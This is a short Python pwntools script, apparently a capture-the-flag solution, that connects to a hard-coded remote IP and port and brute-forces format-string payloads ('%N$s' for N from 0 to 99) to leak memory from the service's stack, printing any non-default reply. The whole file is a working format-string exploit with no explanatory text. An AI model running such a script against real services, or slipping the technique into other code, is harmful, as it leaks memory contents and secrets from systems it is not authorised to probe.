#!/usr/bin/env python3

from pwn import *

context.log_level = 'critical'

host, port = '34.107.92.149', 1234

for num in range(100):
	s = remote(host,port)
	s.recvuntil(': ')
	s.sendline('asd')
	s.recvuntil(': ')
	s.sendline('%' + str(num) +'$s')
	resp = s.recv()
	if b'Entered' == resp:
		continue
	else:
		print(resp)
	s.close()